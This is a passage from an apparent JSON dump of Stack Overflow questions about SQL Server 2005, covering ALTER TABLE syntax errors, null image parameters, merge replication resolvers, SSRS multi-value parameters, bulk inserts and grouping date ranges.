HasPhotoInWorkStorage  bit,\n HasPhotoInMaterialStorage bit,\n HasText  bit);\n\nALTER TABLE Regions\nADD ( HasPhotoInReadyStorage  bit,\n HasPhotoInWorkStorage  bit,\n HasPhotoInMaterialStorage bit\n HasText  bit);\n\nALTER TABLE Provinces\nADD ( HasPhotoInReadyStorage  bit,\n HasPhotoInWorkStorage  bit,\n HasPhotoInMaterialStorage bit\n HasText  bit);\n\n\nALTER TABLE Cities\nADD ( HasPhotoInReadyStorage  bit,\n HasPhotoInWorkStorage  bit,\n HasPhotoInMaterialStorage bit\n HasText  bit);\n\nAlter table Hotels\nAdd \n{\n HasPhotoInReadyStorage  bit,\n HasPhotoInWorkStorage  bit,\n HasPhotoInMaterialStorage bit,\n HasHotelPhotoInReadyStorage  bit,\n HasHotelPhotoInWorkStorage  bit,\n HasHotelPhotoInMaterialStorage bit,\n HasReporterData  bit,\n HasMovieInReadyStorage  bit,\n HasMovieInWorkStorage  bit,\n HasMovieInMaterialStorage bit\n};\n</code></pre>\n\n<p>I get the following errors:</p>\n\n<pre><code>Msg 102, Level 15, State 1, Line 2\nIncorrect syntax near '('.\nMsg 102, Level 15, State 1, Line 9\nIncorrect syntax near '('.\nMsg 102, Level 15, State 1, Line 15\nIncorrect syntax near '('.\nMsg 102, Level 15, State 1, Line 22\nIncorrect syntax near '('.\nMsg 102, Level 15, State 1, Line 29\nIncorrect syntax near '{'.\n</code></pre>\n"},{"tags":["sql-server-2005","c#-2.0","nullable","dbnull"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":425,"score":1,"question_id":8985374,"title":"Why can't I insert DBNull.Value into a nullable image-field in sql server 2005?","body":"<p>Why can't I insert <code>DBNull.Value</code> into a nullable <code>image</code>-field in sql server 2005?</p>\n\n<p>I tried this code:</p>\n\n<pre><code>SqlConnection conn = new SqlConnection(@\"Data Source=.\\sqlexpress;Initial Catalog=PrescriptionTrackingSystem;Integrated Security=True\");\n\n            conn.Open();\n\n            SqlTransaction transaction = conn.BeginTransaction();\n\n            SqlCommand command = new SqlCommand(@\"INSERT INTO Customer(\n                               ID\n                              ,Name\n                              ,TelephoneNumber\n                              ,DateOfBirth,\n                               InsuranceProvider,\n                               PolicyNumber,Photo)\n                          VALUES(\n                               @ID\n                              ,@Name\n                              ,@TelephoneNumber\n                              ,@DateOfBirth,\n                               @InsuranceProvider,\n                               @PolicyNumber,\n                               @Photo)\", conn);\n\n            command.Transaction = transaction;\n\n            command.Parameters.AddWithValue(\"@ID\", 1000);\n            command.Parameters.AddWithValue(\"@Name\", item.Name);\n            command.Parameters.AddWithValue(\"@TelephoneNumber\", item.TelephoneNumber);\n            if (item.DateOfBirth != null)\n            {\n                command.Parameters.AddWithValue(\"@DateOfBirth\", item.DateOfBirth);\n            }\n            else\n            {\n                command.Parameters.AddWithValue(\"@DateOfBirth\", DBNull.Value);\n            }\n            command.Parameters.AddWithValue(\"@InsuranceProvider\", item.InsuranceProvider);\n            command.Parameters.AddWithValue(\"@PolicyNumber\", item.PolicyNumber);\n\n            if (item.Photo != null)\n            {\n                command.Parameters.AddWithValue(\"@Photo\", item.Photo);\n            }\n            else\n            {\n                command.Parameters.AddWithValue(\"@Photo\", DBNull.Value);\n            }\n\n            int count = command.ExecuteNonQuery();\n\n            transaction.Commit();\n\n            conn.Close();\n</code></pre>\n\n<p>item is of type <code>Customer</code>.</p>\n\n<pre><code>public class Customer\n{        \n    public string Name { get; set; }\n    public DateTime? DateOfBirth { get; set; }\n    public string TelephoneNumber { get; set; }\n    public string InsuranceProvider { get; set; }\n    public int? PolicyNumber { get; set; }\n    public byte [] Photo { get; set; }\n}\n</code></pre>\n\n<p>When inserting I get this exception:</p>\n\n<pre><code>Operand type clash: nvarchar is incompatible with image\n</code></pre>\n\n<p>Why <code>DBNull.Value</code> has got problems only with <code>image</code>? Why not with <code>datetime</code>?</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":11121318,"title":"What is the command for executing a T-SQL procedure by passing an input value and take an out put value","body":"<p>Sorry to ask this simple question, I am new to T-SQL</p>\n\n<p>What is the command for executing a T-SQL stored procedure by passing an input value and take an output value?</p>\n\n<p>Say for example there are 2 variables like <code>@id</code> (input) and <code>@sal</code> (output)</p>\n\n<p>Requirement is to pass the id and get salary. So do we need to execute like this?</p>\n\n<pre><code>EXEC USP_PROC1 89, 0\n</code></pre>\n\n<p>(<em>DO I NEED TO PASS THE OUTPUT VARIABLES' DEFAULT VALUE AS WELL</em>)</p>\n\n<p>When I executed it why can not I see any answer? I can only see <code>Command(s) completed successfully</code>.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","merge-replication","resolver"],"answer_count":2,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":158,"score":6,"question_id":10977728,"title":"How to update conflict resolver when upgrading from SQL-Server 2005 to SQL-Server 2008","body":"<p>We have recently upgraded from SQL Server 2005 to SQL Server 2008 (R2, SP1). This upgrade included some publications, where all tables are published with a default conflict resolver based on the \"later wins\" principle. Its smart name is 'Microsoft SQL Server DATETIME (Later Wins) Conflict Resolver', and the corresponding dll file is ssrmax.dll.</p>\n\n<p>As you all know, once a table is published with a conflict resolver, the same conflict resolver must be used in all later publications using this table. Fair enough, but, when adding previously published tables to new publications, and specifying the very same conflict resolver to be used for this table, we are getting an error message: </p>\n\n<pre><code>use [myDb]\nexec sp_addmergearticle \n    @publication = N'myDb_Pub', \n    @article = N'Tbl_blablabla', \n    @source_owner = N'dbo', \n    @source_object = N'Tbl_blablabla', \n    @type = N'table', \n    @description = N'', \n    @creation_script = N'', \n    @pre_creation_cmd = N'drop', \n    @schema_option = 0x000000000C034FD1, \n    @identityrangemanagementoption = N'none', \n    @destination_owner = N'dbo', \n    @force_reinit_subscription = 1, \n    @column_tracking = N'false', \n    @article_resolver = N'Microsoft SQL Server DATETIME (Later Wins) Conflict Resolver', \n    @subset_filterclause = N'', \n    @resolver_info = N'ddmaj', \n    @vertical_partition = N'false', \n    @verify_resolver_signature = 0, \n    @allow_interactive_resolver = N'false', \n    @fast_multicol_updateproc = N'true', \n    @check_permissions = 0, \n    @subscriber_upload_options = 0, \n    @delete_tracking = N'true', \n    @compensate_for_errors = N'false', \n    @stream_blob_columns = N'false', \n    @partition_options = 0\nGO\n</code></pre>\n\n<p>And this is the error we get:</p>\n\n<pre><code>The article '...' already exists in another publication with a different article resolver.\n</code></pre>\n\n<p>By trying to understand how the same conflict resolver is not considered by the machine as 'the same conflict resolver', I discovered that there were two conflict resolvers with the same name, different versions, in the registry:</p>\n\n<p>the 2005 version: </p>\n\n<ul>\n<li>file ssrmax.dll, </li>\n<li>version 2005.90.4035.0, </li>\n<li>cls_id D604B4B5-686B-4304-9613-C4F82B527B10</li>\n</ul>\n\n<p>the 2008 version:</p>\n\n<ul>\n<li>file ssrmax.dll, </li>\n<li>version 2009.100.2500.0, </li>\n<li>cls_id 77209412-47CF-49AF-A347-DCF7EE481277</li>\n</ul>\n\n<p>And I checked that our 2008 server is considering the second one as the 'available custom resolver' (I got this by running sp_enumcustomresolvers). The problem is that both references are available in the registry, so I guess that old publications do refer to the 2005 version, while new publications try to refere to the 2008 version, which is indeed different from the previous one.</p>\n\n<p>So the question is: how can I have the server consider only one of these 2 versions, and this (of course) without having to drop and recreate the existing publications (which would turn our life into hell for the next 2 weeks). </p>\n"},{"tags":["tsql","sql-server-2005","linq-to-sql"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":11118446,"title":"linq to sql merge dates into groups","body":"<p>I have a simple sql query like so:</p>\n\n<pre><code>SELECT dt AS 'startDate'\n , dt AS 'endDate'\nFROM\n    WorkCalendar\nWHERE\n     dt BETWEEN dateadd(yy, datediff(yy, 0, getdate()), 0) AND dateadd(MILLISECOND, -3, dateadd(YEAR, datediff(YEAR, 0, getdate()) + 1, 0))\n     AND isWorkDay = 0\n</code></pre>\n\n<p>This returns all dates from my table containing days free from work in current year.</p>\n\n<p>This is sample output:</p>\n\n<pre><code>startDate               endDate\n2012-01-01 00:00:00     2012-01-01 00:00:00\n2012-01-06 00:00:00     2012-01-06 00:00:00\n2012-01-07 00:00:00     2012-01-07 00:00:00\n2012-01-08 00:00:00     2012-01-08 00:00:00\n2012-01-14 00:00:00     2012-01-14 00:00:00\n2012-01-15 00:00:00     2012-01-15 00:00:00\n2012-01-21 00:00:00     2012-01-21 00:00:00\n2012-01-22 00:00:00     2012-01-22 00:00:00\n</code></pre>\n\n<p>What I would like to do is to group near dates like so:</p>\n\n<pre><code>startDate               endDate\n2012-01-01 00:00:00     2012-01-01 00:00:00\n2012-01-06 00:00:00     2012-01-08 00:00:00\n2012-01-14 00:00:00     2012-01-15 00:00:00\n2012-01-21 00:00:00     2012-01-22 00:00:00\n</code></pre>\n\n<p>If I have 2 or more days that are one by another I would like to join them into groups.</p>\n\n<p>I would like this done with linq to sql as it will be simpler for me to use in webservice, but simple sql will do the trick :)</p>\n"},{"tags":["sql-server-2008","sql-server-2005","database-backups"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":11118817,"title":"Is it possible to export a database from SQL Server 2008 and import it into SQL Server 2005?","body":"<p>I need to move a database from SQL Server 2008 to 2005, did the backup format changed or can I import the exported DB in the SQL Server 2005?</p>\n\n<p>The database has tables, views and stored procedures, and it is not using any 2008 specific features. </p>\n\n<p>If it's not possible, would setting the compatibility mode to <code>SQL-Server 2005 (90)</code> help in this case?</p>\n\n<p>Thank you.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":213,"score":3,"question_id":11116275,"title":"Increment Row Number on Group","body":"<p>I am working on a query for SQL Server 2005 that needs to return data with two 'index' fields. The first index 't_index' should increment every time the 'shade' column changes, whilst the second index increments within the partition of the values in the 'shade' column:</p>\n\n<pre><code>t_index s_index shade\n1       1       A\n1       2       A\n1       3       A\n1       4       A\n1       5       A\n2       1       B\n2       2       B\n2       3       B\n2       4       B\n2       5       B\n</code></pre>\n\n<p>To get the s_index column I am using the following:</p>\n\n<pre><code>Select ROW_NUMBER() OVER(PARTITION BY [shade] ORDER BY [shade]) as s_index\n</code></pre>\n\n<p>My question is how to get the first index to only increment when the value in the 'shade' column changes?</p>\n"},{"tags":["sql-server-2005","dynamic","patch"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":159,"score":0,"question_id":11112520,"title":"Update Column Dynamically SQL script Microsoft SQL Server 2005 ","body":"<p>I am beginner in writing <code>SQL script</code>, I would like to update the data dynamically, due to wrong data was updated previously. But they are too many status I do not wish to change the column name for each status.</p>\n\n<p>I would like to change the bellowing script from:</p>\n\n<pre><code>UPDATE StatusChange\n   SET Status1 = (CASE Status1_MID\n                 WHEN '1' THEN '1;#Member1'\n                 WHEN '2' THEN '2;#Member2'\n                 WHEN '3' THEN '3;#Member3'\n                 END),\n    Status1_DN = (CASE Status1_MID\n                   WHEN '1' THEN 'Member1'\n                   WHEN '2' THEN 'Member2'\n                   WHEN '3' THEN 'Member3'  \n                  END)\n          WHERE id&gt;=100 ;\n</code></pre>\n\n<p>I would like to change the bellowing script to become <code>dynamic</code>, so i can update once only:</p>\n\n<p><code>Set toBePatch ='CurrentStatus'</code>(e.g change the currentstatus to Status1/Status2/Status3)</p>\n\n<pre><code>UPDATE StatusChange\n SET toBePatch  = (CASE toBePatch_MID\n                   WHEN '1' THEN '1;#Member1'\n                   WHEN '2' THEN '2;#Member2'\n                   WHEN '3' THEN '3;#Member3'\n                   END),\n     toBePatch_DN = (CASE toBePatch_MID\n                     WHEN '1' THEN 'Member1'\n                     WHEN '2' THEN 'Member2'\n                     WHEN '3' THEN 'Member3'\n                   END)\n         WHERE id&gt;=100 ;\n</code></pre>\n\n<p>Or you have better suggestion?</p>\n\n<p>thanks</p>\n"},{"tags":["sql-server-2005","reporting-services","parameters","multivalue"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":790,"score":2,"question_id":11108060,"title":"Reporting Services - Multi-value parameter query returning no results","body":"<p>Using SSRS (SQL Server 2005) I've set up two reports. For ease of explanation, let's call them <code>MAIN_REPORT</code> and <code>SUB_REPORT</code>.  </p>\n\n<p><code>MAIN_REPORT</code> runs a query that returns a set of Areas, with multiple TagNames per area:</p>\n\n<pre><code>AREA    Tagname\n----------\nA1        T1\nA1        T2\nA2        T3\nA3        T4\n</code></pre>\n\n<p>If you select one of the Area cells, it opens <code>SUB_REPORT</code> and passes a parameter to <code>@ParentTagNames</code> using <code>Join(Parameters!ResultsOfSearch.Value,\",\")</code>. <code>ResultsOfSearch</code> is equal to the Tagname column above (haven't yet figured out how to limit the Tagnames to only the ones in the selected area, but I'll worry about that later).</p>\n\n<p><code>SUB_REPORT</code> takes the passed parameter and queries a massive database for the tagname, and returns a min, max, and average of available values:</p>\n\n<pre><code>SELECT\nh.TagName as TagName,\nMinimum = convert(decimal(38, 2), Min(h.Value)), \nMaximum = convert(decimal(38, 2), Max(h.Value)), \nAverage = convert(decimal(38, 2), Avg(h.Value)) \nFROM INSQL.Runtime.dbo.History h \nWHERE h.TagName in (@ParentTagNames)\nAND h.wwVersion = 'LATEST'\nAND h.wwRetrievalMode = 'Cyclic'\nAND h.wwResolution = '60000'\nAND h.Value &gt; '-1.0'\nAND h.DateTime &gt;= '2009-09-01 12:00:00'\nAND h.DateTime &lt;= '2009-09-02 16:00:00'\nGROUP BY h.TagName\n</code></pre>\n\n<p>However, if <code>@ParentTagNames</code> is equal to more than one value, it returns no data. If it's equal to a single tag, it returns data. I figured it must have had something to do with the formatting of the data within <code>@ParentTagNames</code> as it's passed from <code>MAIN_REPORT</code>, but it doesn't seem to matter.  </p>\n\n<p>I've tried the following formats:</p>\n\n<pre><code>T1,T2,T3,T4,T5,T6\n'T1','T2','T3','T4','T5','T6'\n</code></pre>\n\n<p>I made sure the multi-value is checked for the parameter <code>@ParentTagNames</code>. Google has successfully failed me.  </p>\n\n<p>Anyone?</p>\n\n<p>EDIT: Profiler magic!</p>\n\n<pre><code>exec sp_executesql N'SELECT\n    h.TagName as TagName,\n    Minimum = convert(decimal(38, 2), Min(h.Value)), \n    Maximum = convert(decimal(38, 2), Max(h.Value)), \n    Average = convert(decimal(38, 2), Avg(h.Value)) \nFROM INSQL.Runtime.dbo.History h \nWHERE h.TagName in (@ParentTagNames)\nAND h.wwVersion = ''LATEST''\nAND h.wwRetrievalMode = ''Cyclic''\n--AND h.wwResolution = @Resolution\nAND h.wwResolution = ''60000''\nAND h.Value &gt; ''-1.0''\n--AND h.DateTime &gt;= @StartTime\n--AND h.DateTime &lt;= @EndTime\n\nAND h.DateTime &gt;= ''2009-09-01 12:00:00''\nAND h.DateTime &lt;= ''2009-09-02 16:00:00''\n\nGROUP BY h.TagName',N'@ParentTagNames nvarchar(46)',@ParentTagNames=N'M12_CPM_Filling_250.Value,M8_Filling_391.Value'\n</code></pre>\n"},{"tags":["sql-server-2005","merge-replication"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":134,"score":1,"question_id":11091619,"title":"Merge replication - publisher missing data from subscriber","body":"<p>I have a database using SQL 2005 merge replication and ther has been data inserted into the subscriber that never went over to the publisher.  I believe there was a conlict that happened over the 14 day retention period ago and I do not see it any more. Can I manually add them into the publisher?  Any ideas or directing me to a good link is appreciated. Thank you. </p>\n"}]}
{"total":14387,"page":17,"pagesize":100,"questions":[{"tags":["c#",".net","asp.net","sql-server-2005","ado.net"],"answer_count":3,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":8325,"score":5,"question_id":1642483,"title":"When using Trusted_Connection=true and SQL Server authentication, will this effect performance?","body":"<p>If a connection string specifies <code>Trusted_Connection=true</code> with SQL Server authentication mode, will performance of my web application be impacted? </p>\n"},{"tags":["java","hibernate","sql-server-2005","jtds"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1091,"score":1,"question_id":11101153,"title":"Cannot load JDBC driver class 'net.sourceforge.jtds.jdbc.Driver'","body":"<p>I have some problems with jtds.</p>\n\n<p>I'm using Hibernate, Tomcat 5.5 on Linux Red Hat Server, SQL Server 2005 with WIndows Server </p>\n\n<p>I save the library into Web-iNF/lib and i'm using the version jtds-1.2.2</p>\n\n<p>I got the Error Message</p>\n\n<blockquote>\n  <p>16:56:17,561 ERROR JDBCExceptionReporter:78 - Cannot load JDBC driver\n  class 'net.sourceforge.jtds.jdbc.Driver'</p>\n</blockquote>\n\n<p>can some one explain what i'm doing wrong? </p>\n\n<p>Here the connection definition. </p>\n\n<pre><code>&lt;Resource name=\"pr/jdbc/dsConn\" auth=\"Container\" type=\"javax.sql.DataSource\" maxActive=\"100\" maxIdle=\"30\" maxWait=\"10000\" username=\"example\" password=\"test1234\" driverClassName=\"net.sourceforge.jtds.jdbc.Driver\" url=\"jdbc:jtds:sqlserver://localhost:1433/example\" /&gt; \n</code></pre>\n\n<p>Can someone help me with this issue?</p>\n\n<p>best regards</p>\n"},{"tags":["sql","sql-server-2005","stored-procedures"],"answer_count":6,"favorite_count":11,"up_vote_count":18,"down_vote_count":0,"view_count":13282,"score":18,"question_id":1069311,"title":"Passing an array of parameters to a stored procedure","body":"<p>I need to pass an array of \"id's\" to a stored procedure, to delete all rows from the table EXCEPT the rows that match id's in the array.</p>\n\n<p>How can I do it in a most simple way?</p>\n"},{"tags":["sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2091,"score":1,"question_id":4769102,"title":"How do we get maximum value from table without using Max,Min or Order by Clause in SQL Server 2005?","body":"<p>I have one table has Salary has 3 columns and I want to get maximum value from this table without using Max, Min or order by clause.</p>\n\n<p>Data </p>\n\n<p>Salary has three fields - <code>ID,Name,Amount</code>\nvalue of Amount - <code>100,70,80,400,300</code></p>\n\n<p>I need to get value of 400 from this data.</p>\n\n<p>I know Select max(Amount) from Salary, But i need without max,min or Order by clause.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["c#","sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":5,"view_count":179,"score":-4,"question_id":10975595,"title":"select birthday upcoming month","body":"<p>I want to display birthday list upcoming month.</p>\n\n<p>The birthdates are stored in the <code>birthday</code> column . How can I display this ?</p>\n"},{"tags":["sql-server-2005","iis","asp-classic"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":199,"score":-1,"question_id":11080230,"title":"Classic ASP, IIS 5.1, errors logging in to SQL Server using Windows Authentication","body":"<p>I'm trying to setup a test environment on my own machine, of our company website written in classic asp. The idea is to use integrated windows authentication to connect to the database.</p>\n\n<p>I'm useing the following connection string</p>\n\n<pre><code>Provider=SQLOLEDB.1;Server=localhost;Database=Filbert;Integrated Security=SSPI;\n</code></pre>\n\n<p>But the browser responds with</p>\n\n<pre><code>Microsoft OLE DB Provider for SQL Server (0x80004005)\n[DBNETLIB][ConnectionOpen (Connect()).]SQL Server does not exist or access denied.\n</code></pre>\n\n<p>In the SQL log I can see</p>\n\n<pre><code>Login failed for user 'NT AUTHORITY\\SYSTEM'. [CLIENT: &lt;local machine&gt;]\nError: 18456, Severity: 14, State: 16.\n</code></pre>\n\n<p>A state 16 errors is whe</p>\n\n<p>I'm running Windows XP SP3, IIS 5.1, SQL server 2005</p>\n\n<p>EDIT: I've also created and tested an login using SQL authentication instead. I'm able to login with the SQL authentication using the SQL management studio just fine, but get the same errors when trying from ASP</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":11078261,"title":"how to get Summation of Calculated value","body":"<pre><code>        select sum(Weight) as 'PP04' from dbo.tbl_insertxmldetails where \n        Section in (select Material from [Mst_tbl_ExtMaterialGroupList] \n        where [Ext# Matl Group] = 'PP04') and\n        OrderName like @jobno+'%'\n</code></pre>\n\n<p>--PP12</p>\n\n<pre><code>         select sum(Weight) as 'PP12' from dbo.tbl_insertxmldetails where \n         Section in (select Material from [Mst_tbl_ExtMaterialGroupList] \n         where [Ext# Matl Group] = 'PP12') and\n         OrderName like @jobno+'%'\n</code></pre>\n\n<p>i want to write Stored procedure for Caluclating the some of PP04 and PP12 in same Stored Procedure .How can I write query in single statement .</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","full-text-search","clustered-index"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":99,"score":0,"question_id":11094119,"title":"Full-text indexing vs %% and clustered index","body":"<p>I have two questions.</p>\n\n<ol>\n<li>Does it make sense when I have to choice of a clustered index on an <code>Integer</code> type column instead of choosing it over string values type column. </li>\n</ol>\n\n<p>Why?</p>\n\n<p><em>The clustered index will cause a reordering of the page data whenever an INSERT is processed because the new row is not appended to the end of the index but inserted in the middle</em></p>\n\n<p>I am right? Any other reason for Choosing the clustered Index for <code>Integer</code> type column? Or I am moving in wrong direction?</p>\n\n<ol>\n<li><p>When I have to search a string using <code>%...%</code> like below query</p>\n\n<pre><code>Select Column1 From Table1 Where Column1 Like '%SomeVal%'\n</code></pre></li>\n</ol>\n\n<p>I have following questions for this.</p>\n\n<ol>\n<li>Does it make sense to use <code>%....%</code> in the above situation?</li>\n<li>Can I put the clustered index for <code>Column1</code> and then go for <code>%....%</code></li>\n<li>Should I choose full-text indexing? If so why I should prefer full-text indexing over <code>%...%</code> ?</li>\n</ol>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":106,"score":1,"question_id":11092576,"title":"SQL Query with Optional Parameter and Possible Null Column","body":"<p>I am having some difficulty returning all the results I would expect when leaving an optional sql parameter blank on a column that contain null values.</p>\n\n<p>Imagine you have a table with the following (referredby is optional and can therefore be NULL):  </p>\n\n<pre><code>Customertable\nID    CustomerName  ReferredBy\n1      Aaron         Joe\n2      Peter         NULL\n3      Steven        Joe\n</code></pre>\n\n<p>Suppose I want to query with an optional SQL parameter for the referredby field like such:</p>\n\n<pre><code>declare @referredby as varchar(15)\n\nselect id, customername\nfrom customertable&lt;br&gt;\nwhere referredby = isnull(@referredby, referredby)\n</code></pre>\n\n<p>If I leave the parameter null, this would only return:<br>\n1 Aaron<br>\n3 Steven</p>\n\n<p>How can I use an optional parameter to return all 3 results?</p>\n"},{"tags":["sql-server-2005","timeout","iis6","sqlexception"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":241,"score":1,"question_id":11092554,"title":"Intermittent sqlexception timeout expired errors","body":"<p>We have an app with around 200-400 users and once a day or every other day we get the dreaded sql exception:</p>\n\n<p>\"Timeout expired. The timeout period elapsed prior to completion of the operation or the server is not responding\".</p>\n\n<p>Once we get this then it happens several times for different users and then all users are stuck.  They can't perform any operations.   </p>\n\n<p>I don't have the full specs of the boxes right in front of me but we have:</p>\n\n<ul>\n<li>IIS and SQL Server running on separate boxes</li>\n<li>each box has 64gb of memory with multiple cores</li>\n</ul>\n\n<p>We get nothing in the SQL server logs (as would be expected) and our application catches the sqlexception so we just see the timeout error there - on an UPDATE.   In the database we have only a few key tables.  The timeout happens on one of the tables where there is 30k of rows.  We have run profiler on these queries hitting the UI against a copy of production to get the size and made sure we have all of the right indexes (clustered/non-clustered).   In a local environment (smaller box, same size database) everything runs fast and to the users most of the day the system runs fast.  The exact same query (which had the timeout error in production) ran in less than a second.  </p>\n\n<p>We did change our command timeout from 30 seconds to 300 seconds (I know that 0 is unlimited and I guess we should use that, but it seems like that's just masking the real problem).</p>\n\n<p>We had the profiler running in production, but unfortunately it wasn't fully enabled the last time it happened.  We are setting it up correctly now.</p>\n\n<p>Any ideas on what this might be?   </p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1928,"score":1,"question_id":11018076,"title":"Splitting delimited values in a SQL column into multiple rows","body":"<p>I would really like some advice here, to give some background info I am working with inserting Message Tracking logs from Exchange 2007 into SQL. As we have millions upon millions of rows per day I am using a Bulk Insert statement to insert the data into a SQL table.</p>\n\n<p>In fact I actually Bulk Insert into a temp table and then from there I MERGE the data into the live table, this is for test parsing issues as certain fields otherwise have quotes and such around the values.</p>\n\n<p>This works well, with the exception of the fact that the recipient-address column is a delimited field seperated by a ; character, and it can be incredibly long sometimes as there can be many email recipients.</p>\n\n<p>I would like to take this column, and split the values into multiple rows which would then be inserted into another table. Problem is anything I am trying is either taking too long or not working the way I want.</p>\n\n<p>Take this example data:</p>\n\n<pre><code>message-id                                              recipient-address\n2D5E558D4B5A3D4F962DA5051EE364BE06CF37A3A5@Server.com   user1@domain1.com\nE52F650C53A275488552FFD49F98E9A6BEA1262E@Server.com     user2@domain2.com\n4fd70c47.4d600e0a.0a7b.ffff87e1@Server.com              user3@domain3.com;user4@domain4.com;user5@domain5.com\n</code></pre>\n\n<p>I would like this to be formatted as followed in my Recipients table:</p>\n\n<pre><code>message-id                                              recipient-address\n2D5E558D4B5A3D4F962DA5051EE364BE06CF37A3A5@Server.com   user1@domain1.com\nE52F650C53A275488552FFD49F98E9A6BEA1262E@Server.com     user2@domain2.com\n4fd70c47.4d600e0a.0a7b.ffff87e1@Server.com              user3@domain3.com\n4fd70c47.4d600e0a.0a7b.ffff87e1@Server.com              user4@domain4.com\n4fd70c47.4d600e0a.0a7b.ffff87e1@Server.com              user5@domain5.com\n</code></pre>\n\n<p>Does anyone have any ideas about how I can go about doing this?</p>\n\n<p>I know PowerShell pretty well, so I tried in that, but a foreach loop even on 28K records took forever to process, I need something that will run as quickly/efficiently as possible.</p>\n\n<p>Thanks!</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","bulkinsert"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":125,"score":0,"question_id":11058587,"title":"Start inserting from the second column on bulk insert","body":"<p>I have a table with 4 columns. I'm trying to bulk insert from a <code>.dat</code> file to a table:</p>\n\n<pre><code>CREATE PROCEDURE insertIntoTable3\n    @path nvarchar(500) \nAS \n\ndeclare @sql varchar(max)\n\nselect @sql='BULK INSERT Test1..Ao7 FROM ''';\nselect @sql=@sql+ @path ;\nselect @sql=@sql+''' with (FIELDTERMINATOR = ''|'' ,  ROWTERMINATOR = ''\\n'' )';\n\nexec(@sql)\n</code></pre>\n\n<p>The <code>.dat</code> file has data for 3 columns, like:</p>\n\n<pre><code>rr  qwerwq  1\nvv  asdf    1\n</code></pre>\n\n<p>I don't want to insert in the first column. I want to insert to the second, third and fourth columns.</p>\n\n<p>Is there a way to start inserting from the second column on in the table?</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":185,"score":2,"question_id":11064681,"title":"find start and end dates over a non-contiguous range","body":"<p>I need to find the start and end dates of range defined as: start date is the first date and the end date is the first date where the subsequent date is two months or more after the end date. There can be multiple possible ranges</p>\n\n<p>I have a table structure like:</p>\n\n<pre><code>ID        int  identity(1,1),\nfk_ID     char(9),\ndateField datetime\n</code></pre>\n\n<p>The data looks like:</p>\n\n<pre><code>1     a     2012-01-01\n2     a     2012-01-05\n3     a     2012-01-12\n4     b     2012-02-01\n5     a     2012-04-01\n6     b     2012-05-01\n7     a     2012-05-30\n</code></pre>\n\n<p>The expected output would look like:</p>\n\n<pre><code>fk_id    startdate    enddate\na        2012-01-01   2012-01-12\na        2012-04-01   2012-05-30\nb        2012-02-01   2012-02-01\nb        2012-05-01   null\n</code></pre>\n\n<p>EDIT:\nBy doing the following:</p>\n\n<pre><code>CREATE TABLE #temp\n(\n    autonum     int     identity(1,1),\n    id          char(9),\n    sd          datetime\n)\n\ninsert into #temp (id, sd) values ('a', '2012-01-01')\ninsert into #temp (id, sd) values ('a', '2012-01-05')\ninsert into #temp (id, sd) values ('a', '2012-01-12')\ninsert into #temp (id, sd) values ('a', '2012-03-01')\ninsert into #temp (id, sd) values ('a', '2012-04-03')\ninsert into #temp (id, sd) values ('a', '2012-06-06')\ninsert into #temp (id, sd) values ('b', '2012-02-12')\ninsert into #temp (id, sd) values ('b', '2012-02-15')\ninsert into #temp (id, sd) values ('b', '2012-03-01')\ninsert into #temp (id, sd) values ('b', '2012-04-03')\ninsert into #temp (id, sd) values ('b', '2012-06-01')\n\nselect t1.id, null as previousend, min(t1.sd) as nextstart\nfrom #temp t1\ngroup by t1.id\nunion\nselect t1.id, t1.sd as enddate, (select min(t2.sd) from #temp t2 where t1.id=t2.id and    t2.sd&gt;t1.sd) as nextstart\nfrom #temp t1\nwhere (select min(t2.sd) from #temp t2 where t1.id=t2.id and t2.sd&gt;t1.sd) &gt;= dateadd(month, 2, t1.sd)\nunion\nselect t1.id, max(t1.sd), null\nfrom #temp t1\ngroup by t1.id\n\ndrop table #temp\n</code></pre>\n\n<p>I can get output like this:</p>\n\n<pre><code>id        previousend             nextstart\n--------- ----------------------- -----------------------\na         NULL                    2012-01-01 00:00:00.000\na         2012-04-03 00:00:00.000 2012-06-06 00:00:00.000\na         2012-06-06 00:00:00.000 NULL\nb         NULL                    2012-02-12 00:00:00.000\nb         2012-06-01 00:00:00.000 NULL\n</code></pre>\n\n<p>Which is very close, but ideally the start and end date of the range would be on the 